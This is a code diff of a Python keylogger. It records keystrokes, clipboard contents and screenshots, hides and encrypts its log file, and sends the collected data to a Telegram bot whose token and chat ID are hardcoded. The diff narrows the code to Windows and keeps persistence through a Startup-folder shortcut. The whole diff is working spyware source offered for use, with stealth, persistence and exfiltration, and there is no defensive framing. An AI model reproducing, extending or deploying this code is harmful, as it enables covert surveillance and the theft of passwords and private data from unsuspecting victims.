@@ -5,8 +5,8 @@
 # 4. Persistence
 
 from tempfile import gettempdir
-from os import system, name, getenv, path, makedirs
-from os.path import isfile, exists, join, expanduser
+from os import system, getenv, path
+from os.path import isfile, exists, join
 import threading
 from pynput import keyboard
 from pyperclip import paste
@@ -16,16 +16,17 @@ import requests
 import pyautogui
 import platform
 from cryptography.fernet import Fernet
+from win32com.client import Dispatch
 
 # Change these values
 TOKEN = "7351189183:AAEvrxX6-o3nZsvvDTGr_NKTyN79nO9DqtA"  # Telegram API Token
 CHAT_ID = "5818909184"  # Telegram Chat ID
 
 # Constants
-INTERVAL = 60   # Interval of upload log file (in seconds)
-SCREENSHOT_INTERVAL = 40  # Interval for taking screenshots (in seconds)
+INTERVAL = 60
+SCREENSHOT_INTERVAL = 90  # Interval for taking screenshots (in seconds)
 
-# Determine the temporary directory based on the OS
+# Determine the temporary directory
 temp_dir = gettempdir()
 FILENAME = join(temp_dir, f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log')
 ENCRYPTED_FILENAME = f'{FILENAME}.enc'
@@ -51,7 +52,7 @@ def collect_system_info() -> str:
     Version: {platform.version()}
     Machine: {platform.machine()}
     Processor: {platform.processor()}
-    Username: {getenv('USER') if name != 'nt' else getenv('USERNAME')}
+    Username: {getenv('USERNAME')}
     """
     return system_info
 
@@ -78,7 +79,7 @@ class Keylogger:
             with open(self.filename, 'a+') as fh:
                 fh.write(data)
 
-            if not file_exists and name == 'nt':  # checks if the system is windows and file didn't exist before
+            if not file_exists:  # Hide the file on Windows
                 system(f'attrib +h {self.filename}')
         except Exception as e:
             alarm(f'Error: {e}')
@@ -259,37 +260,18 @@ class ScreenshotCapture:
     def __del__(self) -> None:
         pass
 
-# Persistence: Add to startup
+# Persistence: Add to startup on Windows
 def add_to_startup() -> None:
     try:
-        if name == 'nt':  # Windows
-            startup_folder = path.join(getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-            script_path = path.abspath(__file__)
-            shortcut_path = path.join(startup_folder, 'keylogger.lnk')
-            if not exists(shortcut_path):
-                import winshell
-                from win32com.client import Dispatch
-                shell = Dispatch('WScript.Shell')
-                shortcut = shell.CreateShortCut(shortcut_path)
-                shortcut.Targetpath = script_path
-                shortcut.WorkingDirectory = path.dirname(script_path)
-                shortcut.save()
-        elif name == 'posix':  # Linux and MacOS
-            startup_folder = path.join(expanduser('~'), '.config', 'autostart')
-            makedirs(startup_folder, exist_ok=True)
-            script_path = path.abspath(__file__)
-            desktop_file_path = path.join(startup_folder, 'keylogger.desktop')
-            if not exists(desktop_file_path):
-                with open(desktop_file_path, 'w') as f:
-                    f.write(f"""[Desktop Entry]
-Type=Application
-Exec=python3 {script_path}
-Hidden=false
-X-GNOME-Autostart-enabled=true
-Name=Keylogger
-Comment=Start Keylogger on login
-""")
-
+        startup_folder = path.join(getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        script_path = path.abspath(__file__)
+        shortcut_path = path.join(startup_folder, 'keylogger.lnk')
+        if not exists(shortcut_path):
+            shell = Dispatch('WScript.Shell')
+            shortcut = shell.CreateShortCut(shortcut_path)
+            shortcut.Targetpath = script_path
+            shortcut.WorkingDirectory = path.dirname(script_path)
+            shortcut.save()
     except Exception as e:
         alarm(f'Persistence Error: {e}')
 
